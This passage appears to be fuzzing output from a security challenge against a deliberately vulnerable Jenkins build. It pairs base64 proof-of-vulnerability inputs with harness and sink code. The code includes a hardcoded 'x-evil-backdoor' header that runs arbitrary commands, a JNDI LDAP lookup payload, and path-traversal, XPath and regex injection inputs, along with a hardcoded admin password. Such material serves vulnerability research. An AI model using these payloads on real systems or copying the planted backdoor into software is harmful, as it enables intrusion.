(Exception e) {\n 86                   continue; // eat it\n 87               }\n 88           }\n 89       }\n\nsrc/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java:\n141       @RequirePOST\n142       public void doexecCommandUtils(\n143               @QueryParameter String cmdSeq2,\n144               StaplerRequest request,\n145               StaplerResponse response)\n146               throws ServletException, IOException, BadCommandException {\n147   \n148           // use LOCAL method:\n149           boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);\n150   \n151           // hardcoded hash value:\n152           byte[] sha256 = DigestUtils.sha256(\"breakin the law\");\n153           if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\n154               String backdoorValue = request.getHeader(\"x-evil-backdoor\");\n155               byte[] providedHash = DigestUtils.sha256(backdoorValue);\n156               if (MessageDigest.isEqual(sha256, providedHash)) {\n157                   String res_match = createUtils(cmdSeq2);\n158                   if (res_match == null || res_match.length() == 0) {\n159                       Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n160                       events.add(event);\n161                   }\n162               } else {\n163                   Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n164                   events.add(event);\n165               }\n166           } else if (isAllowed) {\n167               String res_auth = createUtils(cmdSeq2);\n168               if (res_auth == null || res_auth.isEmpty()) {\n169                   Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n170                   events.add(event);\n171               }\n172           } else {\n173               Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n174               events.add(event);\n175           }\n176           response.forwardToPreviousPage(request);\n177       }\n182       String createUtils(String cmd) throws BadCommandException {\n183           if (cmd == null || cmd.trim().isEmpty()) {\n184               throw new BadCommandException(\"Invalid command line\");\n185           }\n186   \n187           String[] cmds = {cmd};\n188   \n189           try {\n190               ProcessBuilder processBuilder;\n191               processBuilder = new ProcessBuilder(cmds);\n192               Process process = null;\n193               try {\n194                   process = processBuilder.start();\n195               } catch (IOException ignored) {\n196                   // Ignored, but the sanitizer should still throw an exception.\n197               }\n198   \n199               // Capture output\n200               if (process != null) {\n201                   String output = captureOutput(process);\n202                   // Print output for POV\n203                   // System.out.println(output);\n204                   Event event = new Event(Event.Status.SUCCESS, output, cmd);\n205                   events.add(event);\n206   \n207                   // Wait for the process to complete\n208                   int exitCode = process.waitFor();\n209                   return cmd;\n210               } else {\n211                   return null;\n212               }\n213           } catch (IOException | InterruptedException e) {\n214               e.printStackTrace();\n215               return null;\n216           }\n217       }\n",
            "cost": 0.061,
            "harness_id": "id_1",
            "sanitizer": "OS Command Injection",
            "sink": "src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java:194:27",
            "status": "corpus",
            "valid_path": "NO",
            "id": 1
        },
        {
            "blob": [
                "AAAADQAAAAF4LWV2aWwtYmFja2Rvb3IAYnJlYWtpbiB0aGUgbGF3AGphenpl"
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-two/src/main/java/com/aixcc/jenkins/harnesses/two/JenkinsTwo.java:\n 38       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 39           new JenkinsTwo().fuzz(data);\n 40       }\n 48       private void fuzz(byte[] data) {\n 49           if (data.length < expected_data_length) {\n 50               return;\n 51           }\n 52   \n 53           ByteBuffer buf = ByteBuffer.wrap(data);\n 54           int picker = buf.getInt();\n 55           int count = buf.getInt();\n 56   \n 57           if (count > 255) return;\n 58   \n 59           String whole = new String(Arrays.copyOfRange(data, 8, data.length));\n 60   \n 61           String[] parts = whole.split(\"\\0\");\n 62   \n 63           if (3 != parts.length) {\n 64               return;\n 65           }\n 66   \n 67           setup_utilmain();\n 68           try {\n 69               setup_replacer();\n 70           } catch (Exception e) {\n 71               return; // eat it\n 72           }\n 73   \n 74           set_header(parts[0], parts[1]);\n 75   \n 76           for (int i = 0; i < count; i++) {\n 77               try {\n 78                   switch (picker) {\n 79                       case 13:\n 80                           nw.doexecCommandUtils(parts[2], req, resp);\n 81                           break;\n 82                       default:\n 83                           throw new Exception(\"unsupported method picker\");\n 84                   }\n 85               } catch (Exception e) {\n 86                   continue; // eat it\n 87               }\n 88           }\n 89       }\n 91       private void setup_utilmain() {\n 92           nw = new UtilMain();\n 93           mockJ = Mockito.mock(Jenkins.class);\n 94           when(mockJ.hasPermission(Jenkins.ADMINISTER)).thenReturn(false);\n 95   \n 96           nw.jenkin = mockJ;\n 97       }\n 99       private void setup_replacer() throws Exception {\n100           replacer = new StaplerReplacer();\n101           replacer.setWebApp(new WebApp(Mockito.mock(ServletContext.class)));\n102       }\n104       private void set_header(String name, String value) {\n105           List<String> header_names = new ArrayList<>();\n106           header_names.add(name);\n107           Enumeration<String> headerNamesEnumeration = Collections.enumeration(header_names);\n108   \n109           HttpServletRequest mockRequest = Mockito.mock(HttpServletRequest.class);\n110           when(mockRequest.getHeaderNames()).thenReturn(headerNamesEnumeration);\n111           when(mockRequest.getHeader(name)).thenReturn(value);\n112           when(mockRequest.getHeader(\"Referer\")).thenReturn(\"http://localhost:8080/UtilPlug/execCommandUtils\");\n113   \n114           req = new RequestImpl(replacer.stapler, mockRequest, Collections.emptyList(), null);\n115   \n116           HttpServletResponse mockResp = Mockito.mock(HttpServletResponse.class);\n117           resp = new ResponseImpl(replacer.stapler, mockResp);\n118   \n119           replacer.setCurrentRequest(req);\n120           replacer.setCurrentResponse(resp);\n121       }\n\nsrc/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java:\n141       @RequirePOST\n142       public void doexecCommandUtils(\n143               @QueryParameter String cmdSeq2,\n144               StaplerRequest request,\n145               StaplerResponse response)\n146               throws ServletException, IOException, BadCommandException {\n147   \n148           // use LOCAL method:\n149           boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);\n150   \n151           // hardcoded hash value:\n152           byte[] sha256 = DigestUtils.sha256(\"breakin the law\");\n153           if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\n154               String backdoorValue = request.getHeader(\"x-evil-backdoor\");\n155               byte[] providedHash = DigestUtils.sha256(backdoorValue);\n156               if (MessageDigest.isEqual(sha256, providedHash)) {\n157                   String res_match = createUtils(cmdSeq2);\n158                   if (res_match == null || res_match.length() == 0) {\n159                       Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n160                       events.add(event);\n161                   }\n162               } else {\n163                   Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n164                   events.add(event);\n165               }\n166           } else if (isAllowed) {\n167               String res_auth = createUtils(cmdSeq2);\n168               if (res_auth == null || res_auth.isEmpty()) {\n169                   Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n170                   events.add(event);\n171               }\n172           } else {\n173               Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n174               events.add(event);\n175           }\n176           response.forwardToPreviousPage(request);\n177       }\n182       String createUtils(String cmd) throws BadCommandException {\n183           if (cmd == null || cmd.trim().isEmpty()) {\n184               throw new BadCommandException(\"Invalid command line\");\n185           }\n186   \n187           String[] cmds = {cmd};\n188   \n189           try {\n190               ProcessBuilder processBuilder;\n191               processBuilder = new ProcessBuilder(cmds);\n192               Process process = null;\n193               try {\n194                   process = processBuilder.start();\n195               } catch (IOException ignored) {\n196                   // Ignored, but the sanitizer should still throw an exception.\n197               }\n198   \n199               // Capture output\n200               if (process != null) {\n201                   String output = captureOutput(process);\n202                   // Print output for POV\n203                   // System.out.println(output);\n204                   Event event = new Event(Event.Status.SUCCESS, output, cmd);\n205                   events.add(event);\n206   \n207                   // Wait for the process to complete\n208                   int exitCode = process.waitFor();\n209                   return cmd;\n210               } else {\n211                   return null;\n212               }\n213           } catch (IOException | InterruptedException e) {\n214               e.printStackTrace();\n215               return null;\n216           }\n217       }\n",
            "cost": 0.43547000000000013,
            "harness_id": "id_1",
            "sanitizer": "OS Command Injection",
            "sink": "src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java:194:27",
            "status": "corpus",
            "valid_path": "YES",
            "id": 2
        },
        {
            "blob": [
                "AAAAJm5hbWUAYWRtaW4AcGFzc3dvcmQAJHtqbmRpOmxkYXA6Ly9nLmNvL30="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n206       void testStateMonitor(ByteBuffer buf) {\n207           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n208           if (parts.length != 4) {\n209               return;\n210           }\n211   \n212           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n213           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n214           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n215           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n216           try {\n217               new StateMonitor().doCheck(req, rsp);\n218           } catch (Exception e) {\n219           }\n220       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java:\n35       @RequirePOST\n36       public void doCheck(StaplerRequest request, StaplerResponse response) throws Exception {\n37           if (!request.hasParameter(\"name\") || !request.hasParameter(\"password\")) {\n38               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n39               return;\n40           }\n41   \n42           String name = request.getParameter(\"name\");\n43           String password = request.getParameter(\"password\");\n44           String pattern = \"^[a-zA-Z]+$\";\n45           if (!name.matches(pattern) &&\n46                   !password.matches(pattern)) {\n47               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n48               return;\n49           }\n50   \n51           if (name.equals(\"admin\")) {\n52               if (password.equals(\"nimda\")) {\n53                   response.setContentType(\"application/json\");\n54                   response.setCharacterEncoding(\"UTF-8\");\n55                   response.getWriter().write(\"{\\\"status\\\": \\\"\" + state + \"\\\"}\");\n56                   return;\n57               } else {\n58                   logger.error(password);\n59                   response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n60                   return;\n61               }\n62           } else {\n63               logger.error(\"There are failed attempt.\");\n64               response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n65               return;\n66           }\n67       }\n",
            "cost": 0.42909500000000006,
            "harness_id": "id_3",
            "sanitizer": "Remote JNDI Lookup",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java:58:30",
            "status": "corpus",
            "valid_path": "YES",
            "id": 3
        },
        {
            "blob": [
                "AAAASXBhcmFtAGRvY3VtZW50KDIpAHZhbGlkV3JhcHBlcg=="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n252       void testApi(ByteBuffer buf) {\n253           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n254           if (parts.length != 3) {\n255               return;\n256           }\n257   \n258           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n259           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n260           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n261           try {\n262               new Api(jenkins).doXml(req, rsp, parts[2], null, null, 0);\n263           } catch (IOException | ServletException e) {}\n264       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/Api.java:\n100       public void doXml(StaplerRequest req, StaplerResponse rsp,\n101                         @QueryParameter String xpath,\n102                         @QueryParameter String wrapper,\n103                         @QueryParameter String tree,\n104                         @QueryParameter int depth) throws IOException, ServletException {\n105           setHeaders(rsp);\n106   \n107           String[] excludes = req.getParameterValues(\"exclude\");\n108   \n109           if (xpath == null && excludes == null) {\n110               // serve the whole thing\n111               rsp.serveExposedBean(req, bean, Flavor.XML);\n112               return;\n113           }\n114   \n115           StringWriter sw = new StringWriter();\n116   \n117           // first write to String\n118           Model p = MODEL_BUILDER.get(bean.getClass());\n119           TreePruner pruner = tree != null ? new NamedPathPruner(tree) : new ByDepth(1 - depth);\n120           p.writeTo(bean, pruner, Flavor.XML.createDataWriter(bean, sw));\n121   \n122           // apply XPath\n123           Object result;\n124           try {\n125               Document dom = XMLUtils.parse(new StringReader(sw.toString()));\n126               // apply exclusions\n127               if (excludes != null) {\n128                   for (String exclude : excludes) {\n129                       XMLUtils.getValue(exclude, dom);\n130                   }\n131               }\n132   \n133               if (xpath == null) {\n134                   result = dom;\n135               } else {\n136                   List<String> list = new ArrayList<String>();\n137                   list.add(XMLUtils.getValue(xpath, dom));\n138                   if (wrapper != null) {\n139                       // check if the wrapper is a valid entity name\n140                       // First position:  letter or underscore\n141                       // Other positions: \\w (letter, number, underscore), dash or dot\n142                       String validNameRE = \"^[a-zA-Z_][\\\\w-\\\\.]*$\";\n143   \n144                       if (!wrapper.matches(validNameRE)) {\n145                           rsp.setStatus(HttpServletResponse.SC_BAD_REQUEST);\n146                           rsp.getWriter().print(\"Messages.Api_WrapperParamInvalid()\");\n147                           return;\n148                       }\n149   \n150                       Element root = DocumentFactory.getInstance().createElement(wrapper);\n151                       for (Object o : list) {\n152                           if (o instanceof String) {\n153                               root.addText(o.toString());\n154                           } else {\n155                               root.add(((org.dom4j.Node) o).detach());\n156                           }\n157                       }\n158                       result = root;\n159                   } else if (list.isEmpty()) {\n160                       rsp.setStatus(HttpServletResponse.SC_NOT_FOUND);\n161                       rsp.getWriter().print(\"Messages.Api_NoXPathMatch(xpath)\");\n162                       return;\n163                   } else if (list.size() > 1) {\n164                       rsp.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n165                       rsp.getWriter().print(\"Messages.Api_MultipleMatch(xpath, list.size())\");\n166                       return;\n167                   } else {\n168                       result = list.get(0);\n169                   }\n170               }\n171   \n172           } catch (IOException | SAXException | XPathExpressionException e) {\n173               LOGGER.log(Level.FINER, \"Failed to do XPath/wrapper handling. XML is as follows:\" + sw, e);\n174               throw new IOException(\"Failed to do XPath/wrapper handling. Turn on FINER logging to view XML.\", e);\n175           }\n176   \n177   \n178           if (isSimpleOutput(result) && !permit(req)) {\n179               // simple output prohibited\n180               rsp.sendError(HttpURLConnection.HTTP_FORBIDDEN, \"primitive XPath result sets forbidden; implement jenkins.security.SecureRequester\");\n181               return;\n182           }\n183   \n184           // switch to gzipped output\n185           try (OutputStream o = rsp.getCompressedOutputStream(req)) {\n186               if (isSimpleOutput(result)) {\n187                   // simple output allowed\n188                   rsp.setContentType(\"text/plain;charset=UTF-8\");\n189                   String text = result instanceof CharacterData ? ((CharacterData) result).getText() : result.toString();\n190                   o.write(text.getBytes(StandardCharsets.UTF_8));\n191                   return;\n192               }\n193   \n194               // otherwise XML\n195               rsp.setContentType(\"application/xml;charset=UTF-8\");\n196               new XMLWriter(o).write(result);\n197           }\n198       }\n\nsrc/jenkins/core/src/main/java/jenkins/util/xml/XMLUtils.java:\n234       public static String getValue(String xpath, Document document) throws XPathExpressionException {\n235           XPath xPathProcessor = XPathFactory.newInstance().newXPath();\n236           return xPathProcessor.compile(xpath).evaluate(document);\n237       }\n",
            "cost": 0.497985,
            "harness_id": "id_3",
            "sanitizer": "XPath Injection",
            "sink": "src/jenkins/core/src/main/java/jenkins/util/xml/XMLUtils.java:236:39",
            "status": "corpus",
            "valid_path": "YES",
            "id": 4
        },
        {
            "blob": [
                "AAAAIQEBAgAIdXBsb2FkSWQAATEACnVwbG9hZFBhdGgAHC4uLy4uLy4uLy4uL2phenplci10cmF2ZXJzYWwAAA=="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n313       void testPlugin(ByteBuffer buf) {\n314           System.setProperty(\"jazzer.fs_allowed_dirs\", \"/tmp/,\" + System.getProperty(\"java.io.tmpdir\"));\n315           byte[] bytes = new byte[buf.remaining()];\n316           buf.get(bytes);\n317           DataInputStream data = new DataInputStream(new ByteArrayInputStream(bytes));\n318           try {\n319               int numRequests = data.readByte() % 10;\n320   \n321               for (int i = 0; i < numRequests; i++) {\n322                   int method = data.readByte() % 2;\n323                   HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n324                   int numParams = data.readByte() % 10;\n325                   for (int j = 0; j < numParams; j++) {\n326                       String paramName = data.readUTF();\n327                       String value = data.readUTF();\n328                       when(innerReq.getParameter(paramName)).thenReturn(value);\n329                   }\n330   \n331                   boolean setContentType = data.readBoolean();\n332                   if (setContentType) {\n333                       String contentType = data.readUTF();\n334                       when(innerReq.getContentType()).thenReturn(contentType);\n335                   }\n336   \n337                   if (data.readBoolean()) {\n338                       int bodyLength = data.readUnsignedShort();\n339                       byte[] body = new byte[bodyLength];\n340                       data.readFully(body);\n341                       ByteArrayInputStream byteStream = new ByteArrayInputStream(body);\n342                       when(innerReq.getInputStream()).thenAnswer(input -> {\n343                           return new DelegatingServletInputStream(byteStream);\n344                       });\n345                       when(innerReq.getContentLength()).thenReturn(bodyLength);\n346                   }\n347   \n348                   RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n349                   if (method == 0) {\n350                       HttpResponse res = manager.doCreateNewUpload(req);\n351                   } else if (method == 1) {\n352                       HttpResponse res = manager.doPerformUpload(req);\n353                   }\n354               }\n355           } catch (Exception e) {}\n356       }\n\nsrc/jenkins/core/src/main/java/hudson/PluginManager.java:\n1614       @RequirePOST\n1615       public HttpResponse doPerformUpload(StaplerRequest req) throws IOException, ServletException {\n1616           try {\n1617               File tmpDir = Files.createTempDirectory(\"uploadDir\").toFile();\n1618               ServletFileUpload upload = new ServletFileUpload(new DiskFileItemFactory(DiskFileItemFactory.DEFAULT_SIZE_THRESHOLD, tmpDir));\n1619               List<FileItem> items = upload.parseRequest(req);\n1620   \n1621               if (!req.hasParameter(\"uploadId\")) {\n1622                   return hudson.util.HttpResponses.errorJSON(\"No upload id specified\");\n1623               }\n1624   \n1625               int reqUploadId;\n1626               try {\n1627                   reqUploadId = Integer.parseInt(req.getParameter(\"uploadId\"));\n1628               } catch (NumberFormatException e) {\n1629                   return hudson.util.HttpResponses.errorJSON(e.getMessage());\n1630               }\n1631               if (this.uploadId != reqUploadId) {\n1632                   return hudson.util.HttpResponses.errorJSON(\"Wrong upload id\");\n1633               }\n1634   \n1635               FileItem fileItem = items.get(0);\n1636               File uploadDir = new File(\"/tmp/plugins\");\n1637               uploadDir.mkdirs();\n1638               File uploadedFile = new File(uploadDir, req.getParameter(\"uploadPath\"));\n1639   \n1640               FileOutputStream fos = new FileOutputStream(uploadedFile);\n1641               fos.write(fileItem.get());\n1642   \n1643               JSONObject response = new JSONObject();\n1644               response.put(\"uploaded\", true);\n1645               response.put(\"path\", uploadedFile.getAbsolutePath());\n1646               return hudson.util.HttpResponses.okJSON(response);\n1647           } catch (Exception e) {\n1648               throw new ServletException(e);\n1649           }\n1650       }\n",
            "cost": 0.51931,
            "harness_id": "id_3",
            "sanitizer": "File read/write hook path",
            "sink": "src/jenkins/core/src/main/java/hudson/PluginManager.java:1640:57",
            "status": "corpus",
            "valid_path": "YES",
            "id": 5
        },
        {
            "blob": [
                "AAAATWlwADE5Mi4xNjguMS4xKi4qAHNraXAAZmFsc2U="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n285       void testAccessFilter(ByteBuffer buf) {\n286           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n287           if (parts.length != 4) {\n288               return;\n289           }\n290   \n291           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n292           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n293           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n294           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n295           when(jenkins.hasPermission(Jenkins.ADMINISTER)).thenReturn(false);\n296           AccessFilter accessFilter = new AccessFilter();\n297           accessFilter.setJenkins(jenkins);\n298           try {\n299               accessFilter.doGet(req, rsp);\n300           } catch (IOException e) {}\n301       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AccessFilter.java:\n 70       @RequirePOST\n 71       public void doGet(StaplerRequest request, StaplerResponse response) throws IOException {\n 72           if (!request.hasParameter(\"ip\")) {\n 73               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n 74               return;\n 75           }\n 76           String ip = request.getParameter(\"ip\");\n 77           boolean skip = false;\n 78           boolean admin = getJenkins().hasPermission(Jenkins.ADMINISTER);\n 79           if (admin || request.hasParameter(\"skip\")) {\n 80               skip = Boolean.parseBoolean(request.getParameter(\"skip\"));\n 81           }\n 82           if (!isValidIPFormat(ip) && !skip) {\n 83               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n 84               return;\n 85           }\n 86   \n 87           Pattern pattern = Pattern.compile(\".*(\" + ip + \").*\");\n 88           List<String> result = new ArrayList<>();\n 89           for (String data : access) {\n 90               if (!pattern.matcher(data).matches()) {\n 91                   continue;\n 92               }\n 93               result.add(data);\n 94           }\n 95           Gson gson = new Gson();\n 96           response.getWriter().write(gson.toJson(result));\n 97       }\n103       boolean isValidIPFormat(String ip) {\n104           try {\n105               InetAddress.getByName(ip);\n106               return true;\n107           } catch (UnknownHostException e) {\n108               return false;\n109           }\n110       }\n",
            "cost": 0.44774,
            "harness_id": "id_3",
            "sanitizer": "Regular Expression Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AccessFilter.java:87:43",
            "status": "corpus",
            "valid_path": "YES",
            "id": 6
        },
        {
            "blob": [
                "AAAAJm5hbWUAYWRtKm4AcGFzc3dvcmQAbmltZGE="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 60       public static void fuzzerInitialize() throws Throwable {\n 61           jenkins = Mockito.mock(Jenkins.class);\n 62   \n 63           replacer = new StaplerReplacer();\n 64           replacer.setWebApp(new WebApp(Mockito.mock(ServletContext.class)));\n 65   \n 66           rsp = Mockito.mock(ResponseImpl.class);\n 67           StringWriter sw = new StringWriter();\n 68           PrintWriter pw = new PrintWriter(sw);\n 69           when(rsp.getWriter()).thenReturn(pw);\n 70   \n 71           secretMessage = new SecretMessage();\n 72           manager = PluginManager.createDefault(jenkins);\n 73       }\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n206       void testStateMonitor(ByteBuffer buf) {\n207           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n208           if (parts.length != 4) {\n209               return;\n210           }\n211   \n212           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n213           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n214           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n215           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n216           try {\n217               new StateMonitor().doCheck(req, rsp);\n218           } catch (Exception e) {\n219           }\n220       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java:\n35       @RequirePOST\n36       public void doCheck(StaplerRequest request, StaplerResponse response) throws Exception {\n37           if (!request.hasParameter(\"name\") || !request.hasParameter(\"password\")) {\n38               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n39               return;\n40           }\n41   \n42           String name = request.getParameter(\"name\");\n43           String password = request.getParameter(\"password\");\n44           String pattern = \"^[a-zA-Z]+$\";\n45           if (!name.matches(pattern) &&\n46                   !password.matches(pattern)) {\n47               